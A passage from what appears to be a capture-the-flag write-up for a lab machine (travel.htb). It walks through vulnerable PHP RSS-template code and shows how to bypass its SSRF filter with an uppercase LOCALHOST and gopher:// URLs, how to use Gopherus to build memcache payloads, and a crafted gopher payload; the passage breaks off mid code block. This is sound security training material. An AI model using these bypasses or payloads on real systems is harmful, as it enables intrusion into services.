</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>Template Name: Awesome RSS
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;template.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>get_header</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;main class=&#34;section-inner&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>	function get_feed($url){
</span></span></span><span class=line><span class=cl><span class=err>     require_once ABSPATH . &#39;/wp-includes/class-simplepie.php&#39;;
</span></span></span><span class=line><span class=cl><span class=err>     $simplepie = null;
</span></span></span><span class=line><span class=cl><span class=err>     $data = url_get_contents($url);
</span></span></span><span class=line><span class=cl><span class=err>     if ($url) {
</span></span></span><span class=line><span class=cl><span class=err>         $simplepie = new SimplePie();
</span></span></span><span class=line><span class=cl><span class=err>         $simplepie-&gt;set_cache_location(&#39;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#39;);
</span></span></span><span class=line><span class=cl><span class=err>         //$simplepie-&gt;set_raw_data($data);
</span></span></span><span class=line><span class=cl><span class=err>         $simplepie-&gt;set_feed_url($url);
</span></span></span><span class=line><span class=cl><span class=err>         $simplepie-&gt;init();
</span></span></span><span class=line><span class=cl><span class=err>         $simplepie-&gt;handle_content_type();
</span></span></span><span class=line><span class=cl><span class=err>         if ($simplepie-&gt;error) {
</span></span></span><span class=line><span class=cl><span class=err>             error_log($simplepie-&gt;error);
</span></span></span><span class=line><span class=cl><span class=err>             $simplepie = null;
</span></span></span><span class=line><span class=cl><span class=err>             $failed = True;
</span></span></span><span class=line><span class=cl><span class=err>         }
</span></span></span><span class=line><span class=cl><span class=err>     } else {
</span></span></span><span class=line><span class=cl><span class=err>         $failed = True;
</span></span></span><span class=line><span class=cl><span class=err>     }
</span></span></span><span class=line><span class=cl><span class=err>     return $simplepie;
</span></span></span><span class=line><span class=cl><span class=err> 	 }
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err> 	$url = $_SERVER[&#39;QUERY_STRING&#39;];
</span></span></span><span class=line><span class=cl><span class=err>	if(strpos($url, &#34;custom_feed_url&#34;) !== false){
</span></span></span><span class=line><span class=cl><span class=err>		$tmp = (explode(&#34;=&#34;, $url));
</span></span></span><span class=line><span class=cl><span class=err>		$url = end($tmp);
</span></span></span><span class=line><span class=cl><span class=err> 	 } else {
</span></span></span><span class=line><span class=cl><span class=err> 	 	$url = &#34;http://www.travel.htb/newsfeed/customfeed.xml&#34;;
</span></span></span><span class=line><span class=cl><span class=err> 	 }
</span></span></span><span class=line><span class=cl><span class=err> 	 $feed = get_feed($url);
</span></span></span><span class=line><span class=cl><span class=err>     if ($feed-&gt;error())
</span></span></span><span class=line><span class=cl><span class=err>		{
</span></span></span><span class=line><span class=cl><span class=err>			echo &#39;&lt;div class=&#34;sp_errors&#34;&gt;&#39; . &#34;\r\n&#34;;
</span></span></span><span class=line><span class=cl><span class=err>			echo &#39;&lt;p&gt;&#39; . htmlspecialchars($feed-&gt;error()) . &#34;&lt;/p&gt;\r\n&#34;;
</span></span></span><span class=line><span class=cl><span class=err>			echo &#39;&lt;/div&gt;&#39; . &#34;\r\n&#34;;
</span></span></span><span class=line><span class=cl><span class=err>		}
</span></span></span><span class=line><span class=cl><span class=err>		else {
</span></span></span><span class=line><span class=cl><span class=err>	?&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;div class=&#34;chunk focus&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>		&lt;h3 class=&#34;header&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>		&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>			$link = $feed-&gt;get_link();
</span></span></span><span class=line><span class=cl><span class=err>			$title = $feed-&gt;get_title();
</span></span></span><span class=line><span class=cl><span class=err>			if ($link)
</span></span></span><span class=line><span class=cl><span class=err>			{
</span></span></span><span class=line><span class=cl><span class=err>				$title = &#34;&lt;a href=&#39;$link&#39; title=&#39;$title&#39;&gt;$title&lt;/a&gt;&#34;;
</span></span></span><span class=line><span class=cl><span class=err>			}
</span></span></span><span class=line><span class=cl><span class=err>			echo $title;
</span></span></span><span class=line><span class=cl><span class=err>		?&gt;
</span></span></span><span class=line><span class=cl><span class=err>		&lt;/h3&gt;
</span></span></span><span class=line><span class=cl><span class=err>		&lt;?php echo $feed-&gt;get_description(); ?&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>	&lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;?php foreach($feed-&gt;get_items() as $item): ?&gt;
</span></span></span><span class=line><span class=cl><span class=err>		&lt;div class=&#34;chunk&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>			&lt;h4&gt;&lt;?php if ($item-&gt;get_permalink()) echo &#39;&lt;a href=&#34;&#39; . $item-&gt;get_permalink() . &#39;&#34;&gt;&#39;; echo $item-&gt;get_title(); if ($item-&gt;get_permalink()) echo &#39;&lt;/a&gt;&#39;; ?&gt;&amp;nbsp;&lt;span class=&#34;footnote&#34;&gt;&lt;?php echo $item-&gt;get_date(&#39;j M Y, g:i a&#39;); ?&gt;&lt;/span&gt;&lt;/h4&gt;
</span></span></span><span class=line><span class=cl><span class=err>			&lt;?php echo $item-&gt;get_content(); ?&gt;
</span></span></span><span class=line><span class=cl><span class=err>			&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>			if ($enclosure = $item-&gt;get_enclosure(0))
</span></span></span><span class=line><span class=cl><span class=err>			{
</span></span></span><span class=line><span class=cl><span class=err>				echo &#39;&lt;div align=&#34;center&#34;&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>				echo &#39;&lt;p&gt;&#39; . $enclosure-&gt;embed(array(
</span></span></span><span class=line><span class=cl><span class=err>					&#39;audio&#39; =&gt; &#39;./for_the_demo/place_audio.png&#39;,
</span></span></span><span class=line><span class=cl><span class=err>					&#39;video&#39; =&gt; &#39;./for_the_demo/place_video.png&#39;,
</span></span></span><span class=line><span class=cl><span class=err>					&#39;mediaplayer&#39; =&gt; &#39;./for_the_demo/mediaplayer.swf&#39;,
</span></span></span><span class=line><span class=cl><span class=err>					&#39;altclass&#39; =&gt; &#39;download&#39;
</span></span></span><span class=line><span class=cl><span class=err>				)) . &#39;&lt;/p&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>				if ($enclosure-&gt;get_link() &amp;&amp; $enclosure-&gt;get_type())
</span></span></span><span class=line><span class=cl><span class=err>				{
</span></span></span><span class=line><span class=cl><span class=err>					echo &#39;&lt;p class=&#34;footnote&#34; align=&#34;center&#34;&gt;(&#39; . $enclosure-&gt;get_type();
</span></span></span><span class=line><span class=cl><span class=err>					if ($enclosure-&gt;get_size())
</span></span></span><span class=line><span class=cl><span class=err>					{
</span></span></span><span class=line><span class=cl><span class=err>						echo &#39;; &#39; . $enclosure-&gt;get_size() . &#39; MB&#39;;
</span></span></span><span class=line><span class=cl><span class=err>					}
</span></span></span><span class=line><span class=cl><span class=err>					echo &#39;)&lt;/p&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>				}
</span></span></span><span class=line><span class=cl><span class=err>				if ($enclosure-&gt;get_thumbnail())
</span></span></span><span class=line><span class=cl><span class=err>				{
</span></span></span><span class=line><span class=cl><span class=err>					echo &#39;&lt;div&gt;&lt;img src=&#34;&#39; . $enclosure-&gt;get_thumbnail() . &#39;&#34; alt=&#34;&#34; /&gt;&lt;/div&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>				}
</span></span></span><span class=line><span class=cl><span class=err>				echo &#39;&lt;/div&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>			}
</span></span></span><span class=line><span class=cl><span class=err>			?&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>		&lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>	&lt;?php endforeach; ?&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php } ?&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/main&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;!--
</span></span></span><span class=line><span class=cl><span class=err>DEBUG
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>if (isset($_GET[&#39;debug&#39;])){
</span></span></span><span class=line><span class=cl><span class=err>  include(&#39;debug.php&#39;);
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span><span class=line><span class=cl><span class=err>--&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php get_template_part( &#39;template-parts/footer-menus-widgets&#39; ); ?&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>get_footer();
</span></span></span></code></pre></td></tr></table></div></div><p>Lines 33, 34, 40 seems to show a user controlled input. Lines 103, 104 teels use we can enable
a debug feature that may be show more verbose messages. On line 5, <code>template.php</code> is included
so let&rsquo;s take a look at it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> Todo: finish logging implementation via TemplateHelper
</span></span></span><span class=line><span class=cl><span class=sd>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>safe</span><span class=p>(</span><span class=nv>$url</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// this should be secure
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nv>$tmpUrl</span> <span class=o>=</span> <span class=nx>urldecode</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$tmpUrl</span><span class=p>,</span> <span class=s2>&#34;file://&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span> <span class=k>or</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$tmpUrl</span><span class=p>,</span> <span class=s2>&#34;@&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>die</span><span class=p>(</span><span class=s2>&#34;&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$tmpUrl</span><span class=p>,</span> <span class=s2>&#34;-o&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span> <span class=k>or</span> <span class=nx>strpos</span><span class=p>(</span><span class=nv>$tmpUrl</span><span class=p>,</span> <span class=s2>&#34;-F&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>die</span><span class=p>(</span><span class=s2>&#34;&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nv>$tmp</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nx>PHP_URL_HOST</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// preventing all localhost access
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span><span class=p>(</span><span class=nv>$tmp</span> <span class=o>==</span> <span class=s2>&#34;localhost&#34;</span> <span class=k>or</span> <span class=nv>$tmp</span> <span class=o>==</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>die</span><span class=p>(</span><span class=s2>&#34;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nv>$url</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>url_get_contents</span> <span class=p>(</span><span class=nv>$url</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$url</span> <span class=o>=</span> <span class=nx>safe</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$url</span> <span class=o>=</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$pl</span> <span class=o>=</span> <span class=s2>&#34;curl &#34;</span><span class=o>.</span><span class=nv>$url</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$output</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$pl</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$output</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>TemplateHelper</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$file</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$file</span><span class=p>,</span> <span class=nx>string</span> <span class=nv>$data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>    	<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>init</span><span class=p>(</span><span class=nv>$file</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>    	<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>init</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>init</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$file</span><span class=p>,</span> <span class=nx>string</span> <span class=nv>$data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span> <span class=o>=</span> <span class=nv>$file</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span> <span class=o>=</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=no>__DIR__</span><span class=o>.</span><span class=s1>&#39;/logs/&#39;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>What we saw in <code>rss_template.php</code>:</p><ol><li>L40 <code>get_feed()</code> is called with <code>$url</code> as arg</li><li>L33 <code>$url</code> is user controlled via <code>custom_feed_url</code> in the URL</li><li>L14 In <code>get_feed()</code> the function <code>url_get_contents()</code> is called</li></ol><p><code>url_get_contents()</code> is a custom function that reminds us the official
<a href=https://www.php.net/manual/en/function.file-get-contents>file_get_contents</a> function.</p><p>Now what we can see in <code>template.php</code>:</p><ol><li>L28-34 <code>url_get_contents()</code> is defined</li></ol><ul><li>L29 the <code>safe()</code> custom function is called</li><li>L30 the <code>escapeshellarg()</code> native function is called (see <a href=https://www.php.net/manual/en/function.escapeshellarg>the doc</a>)</li><li>L31-32 <code>curl</code> is called inside <code>shell_exec()</code> with user controlled argument</li><li>This gives potential for local file disclosure, SSRF and RCE. Maybe even XXE if SimplePie parser is vulnerable.</li></ul><ol start=2><li>L7-26 the <code>safe()</code> function seems to some basic filtering that is bypassable</li></ol><p>The feed seems available for display at those endpoints:</p><ul><li>(raw) <a href=http://www.travel.htb/newsfeed/customfeed.xml>http://www.travel.htb/newsfeed/customfeed.xml</a></li><li>(parsed) <a href=http://blog.travel.htb/awesome-rss/>http://blog.travel.htb/awesome-rss/</a></li></ul><p>However the feed <a href=http://blog.travel.htb/feed/>http://blog.travel.htb/feed/</a> we saw earlier seems to be completely
different and won&rsquo;t interest us.</p><p>It seems that <a href=http://blog.travel.htb/awesome-rss/>http://blog.travel.htb/awesome-rss/</a> is using <code>rss_template.php</code>
to parse <a href=http://www.travel.htb/newsfeed/customfeed.xml>http://www.travel.htb/newsfeed/customfeed.xml</a> and render it in HTML.</p><p>We can alter this behavior by providing another feed source with the parameter
<code>custom_feed_url</code>. For example we can provide this alternative RSS
source: <a href="http://blog.travel.htb/awesome-rss/?custom_feed_url=http://blog.travel.htb/feed/">http://blog.travel.htb/awesome-rss/?custom_feed_url=http://blog.travel.htb/feed/</a>.</p><p>The <code>safe()</code> function disable us to use <code>file://</code> protocol but <code>gopher://</code> may
be use instead. <code>127.0.0.1</code> and <code>localhost</code> are filtered but that&rsquo;s easily
bypassable.</p><p>L17 we also saw there was a memcache server. <code>gopher://</code> will allow us to interact
with memcache so it seems the way to go.</p><p>Let&rsquo;s see if we can craft a gopher payload that bypass the filters
to check if we can use gopher.</p><p>Let&rsquo;s quickly check that the string comparison is case sensitive in PHP.
Hopefully URL are case insensitive so <code>LOCALHOST</code> will be accepted by the server
and not filtered by <code>safe()</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>-</span><span class=nx>a</span>
</span></span><span class=line><span class=cl><span class=nx>Interactive</span> <span class=nx>shell</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=s2>&#34;LOCALHOST&#34;</span> <span class=o>==</span> <span class=s2>&#34;localhost&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>bool</span><span class=p>(</span><span class=k>false</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Requesting on port 80 we can access the local HTTP server and bypass <code>safe()</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://LOCALHOST:80/
</span></span></code></pre></td></tr></table></div></div><p>Other localhost bypasses may be found on <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#payloads-with-localhost>PayloadsAllTheThings</a>.</p><p>If one didn&rsquo;t see the memcache URL it&rsquo;s still possible to bruteforce ports
to check available services on localhost.</p><p>To create gopher payloads there is no better tool than <a href=https://github.com/tarunkant/Gopherus>Gopherus</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ gopherus --exploit dmpmemcache
</span></span><span class=line><span class=cl>$ gopherus --exploit phpmemcache
</span></span></code></pre></td></tr></table></div></div><p>With the first command we will be able to dump the Memcached content and with
the second one to execute a PHP payload.</p><p>Let&rsquo;s try some basic memcache commands found on <a href=https://book.hacktricks.xyz/pentesting/11211-memcache#protocol-information>HackTricks</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>gopherus</span> <span class=o>--</span><span class=n>exploit</span> <span class=n>dmpmemcache</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>________</span>              <span class=o>.</span><span class=n>__</span>
</span></span><span class=line><span class=cl> <span class=o>/</span>  <span class=n>_____</span><span class=o>/</span>  <span class=n>____</span> <span class=n>______</span> <span class=o>|</span>  <span class=o>|</span><span class=n>__</span>   <span class=n>___________</span> <span class=n>__</span> <span class=n>__</span>  <span class=n>______</span>
</span></span><span class=line><span class=cl><span class=o>/</span>   \  <span class=n>___</span> <span class=o>/</span>  <span class=n>_</span> \\<span class=n>____</span> \<span class=o>|</span>  <span class=o>|</span>  \<span class=n>_</span><span class=o>/</span> <span class=n>__</span> \<span class=n>_</span>  <span class=n>__</span> \  <span class=o>|</span>  \<span class=o>/</span>  <span class=n>___</span><span class=o>/</span>
</span></span><span class=line><span class=cl>\    \<span class=n>_</span>\  <span class=p>(</span>  <span class=o>&lt;</span><span class=n>_</span><span class=o>&gt;</span> <span class=p>)</span>  <span class=o>|</span><span class=n>_</span><span class=o>&gt;</span> <span class=o>&gt;</span>   <span class=n>Y</span>  \  <span class=n>___</span><span class=o>/|</span>  <span class=o>|</span> \<span class=o>/</span>  <span class=o>|</span>  <span class=o>/</span>\<span class=n>___</span> \
</span></span><span class=line><span class=cl> \<span class=n>______</span>  <span class=o>/</span>\<span class=n>____</span><span class=o>/|</span>   <span class=n>__</span><span class=o>/|</span><span class=n>___</span><span class=o>|</span>  <span class=o>/</span>\<span class=n>___</span>  <span class=o>&gt;</span><span class=n>__</span><span class=o>|</span>  <span class=o>|</span><span class=n>____</span><span class=o>//</span><span class=n>____</span>  <span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        \<span class=o>/</span>       <span class=o>|</span><span class=n>__</span><span class=o>|</span>        \<span class=o>/</span>     \<span class=o>/</span>                 \<span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>author</span><span class=p>:</span> <span class=o>$</span><span class=n>_SpyD3r_</span><span class=o>$</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Give</span> <span class=n>payload</span> <span class=n>you</span> <span class=n>want</span> <span class=n>to</span> <span class=n>run</span> <span class=ow>in</span> <span class=n>Memcached</span> <span class=n>Server</span><span class=p>:</span> <span class=n>version</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Your</span> <span class=n>gopher</span> <span class=n>link</span> <span class=n>is</span> <span class=n>ready</span> <span class=n>to</span> <span class=n>dump</span> <span class=n>Memcache</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gopher</span><span class=p>:</span><span class=o>//</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>11211</span><span class=o>/</span><span class=n>_</span><span class=o>%</span><span class=mi>0</span><span class=n>d</span><span class=o>%</span><span class=mi>0</span><span class=n>aversion</span><span class=o>%</span><span class=mi>0</span><span class=n>d</span><span class=o>%</span><span class=mi>0</span><span class=n>a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>-----------</span><span class=n>Made</span><span class=o>-</span><span class=n>by</span><span class=o>-</span><span class=n>SpyD3r</span><span class=o>----------</span>
</span></span></code></pre></td></tr></table></div></div><p>Then we just have to replace <code>127.0.0.1</code> by <code>LOCALHOST</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
